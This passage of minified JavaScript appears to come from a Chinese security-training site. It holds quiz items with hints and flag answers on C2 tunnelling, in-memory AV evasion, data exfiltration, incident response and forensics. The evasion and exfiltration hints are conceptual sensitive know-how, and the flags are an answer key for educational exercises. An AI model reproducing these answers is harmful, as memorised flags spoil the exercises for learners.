证书异常、流量行为分析。",answer:"flag{c2_dns_tunnel_https_domain_fronting}",target_id:null,skills:["C2","流量隐蔽"]},{id:906,title:"内存免杀技术",type:"免杀",difficulty:"hard",description:"为什么传统的基于文件的杀毒软件难以检测内存中的恶意代码？列举 2 种将 Shellcode 注入内存的技术。",hint:"内存中无文件落地，AV 无法扫描文件。技术：Process Hollowing（进程镂空）、Process Doppelgänging、DLL 注入、反射式 DLL 注入。",answer:"flag{fileless_process_hollowing_dll_inject}",target_id:null,skills:["免杀","内存注入"]},{id:907,title:"数据渗出技术",type:"数据外泄",difficulty:"hard",description:"攻击者从内部网络窃取数据时，有哪些隐蔽的数据渗出方式？企业应如何检测和防御？",hint:"方式：DNS 外泄、HTTPS 上传、隐蔽信道（ICMP）、云服务（OneDrive/ Dropbox）。防御：DLP 系统、出口流量监控、外联白名单、数据分类分级。",answer:"flag{exfil_dns_https_icmp_dlp_monitor}",target_id:null,skills:["数据外泄","DLP"]}]},{id:10,title:"应急响应与数字取证题单",description:"覆盖事件响应流程、日志分析、内存取证、磁盘取证等企业级安全运营技能。",tags:["应急响应","取证","SOC"],difficulty:"hard",problems:[{id:1001,title:"事件响应六阶段",type:"应急响应",difficulty:"easy",description:"NIST SP 800-61 定义的网络安全事件响应生命周期包括哪六个阶段？请按顺序列出。",hint:"准备 -> 检测与分析 -> 遏制 -> 根除 -> 恢复 -> 事后复盘（Lessons Learned）。",answer:"flag{ncsir_prepare_detect_contain_eradicate_recover_lessons}",target_id:null,skills:["应急响应","NIST"]},{id:1002,title:"Windows 事件日志分析",type:"日志分析",difficulty:"medium",description:"在 Windows 安全日志中，事件 ID 4624、4625、4648、4672 分别代表什么？攻击者横向移动时会留下哪个事件 ID？",hint:"4624=登录成功，4625=登录失败，4648=显式凭证登录，4672=特权使用。横向移动常见 4624（Type 3 网络登录）和 4648。",answer:"flag{eventid_4624_4625_4648_4672}",target_id:null,skills:["Windows日志","事件分析"]},{id:1003,title:"内存取证找恶意进程",type:"内存取证",difficulty:"medium",description:"使用 Volatility 分析 Windows 内存镜像，找出可疑进程。列举 3 个 Volatility 常用命令及其作用。",hint:"pslist / psscan：列出进程；malfind：查找注入代码；netscan：查看网络连接；cmdscan：查看命令行历史。",answer:"flag{volatility_pslist_malfind_netscan_cmdscan}",target_id:null,skills:["Volatility","内存取证"]},{id:1004,title:"WebShell 检测",type:"入侵检测",difficulty:"medium",description:"服务器被上传 WebShell 后，如何从日志和文件层面检测？列举 3 种检测方法。",hint:"1) 分析 access.log 中异常 POST 请求（如大量 POST 到不常见 PHP 文件）；2) 检查文件修改时间；3) 用 D 盾/河马等 WebShell 查杀工具扫描。",answer:"flag{webshell_log_post_filetime_scanner}",target_id:null,skills:["WebShell","入侵检测"]},{id:1005,title:"勒索软件应急响应",type:"应急响应",difficulty:"hard",description:"公司内网爆发勒索软件，作为应急响应人员，前 30 分钟应该执行哪些关键操作？至少列出 5 步。",hint:"1) 隔离受感染主机（拔网线/阻断通信）；2) 确认勒索软件家族；3) 保留证据（内存、磁盘镜像）；4) 通知相关团队；5) 评估影响范围；6) 检查备份可用性。",answer:"flag{ransomware_isolate_identify_preserve_notify_assess_backup}",target_id:null,skills:["勒索软件","应急响应"]},{id:1006,title:"ATT&CK 矩阵分析",type:"威胁情报",difficulty:"hard",description:"MITRE ATT&CK 框架中，Initial Access、Persistence、Exfiltration 三个阶段各包含哪些技术？列举每个阶段 2 个技术。",hint:"Initial Access：钓鱼、漏洞利用；Persistence：Run Key、WMI 事件；Exfiltration：Web 服务、C2 通道。",answer:"flag{attck_phishing_runkey_exfil_web}",target_id:null,skills:["ATT&CK","威胁情报"]},{id:1007,title:"磁盘取证：删除文件恢复",type:"磁盘取证",difficulty:"hard",description:"攻击者删除了日志文件，为什么还能恢复？解释文件系统删除文件的原理，以及 2 种恢复方法。",hint:"删除文件通常只是标记 inode 和数据块为可用，数据本身还在磁盘上。方法：文件雕刻（File Carving）、从文件系统日志（journal）恢复。",answer:"flag{deleted_file_inode_carving_journal}",target_id:null,skills:["磁盘取证","文件恢复"]}]}],o=a.courses,l=s.targets,c=i;function d(e){const n=(e||"").toLowerCase();return n==="easy"?"badge-easy":n==="medium"?"badge-medium":n==="hard"?"badge-hard":"badge-medium"}function p(e){const n=(e||"").toLowerCase();return n==="easy"?"简单":n==="medium"?"中等":n==="hard"?"困难":e||"未知"}export{d as a,o as c,p as d,c as p,l as t};
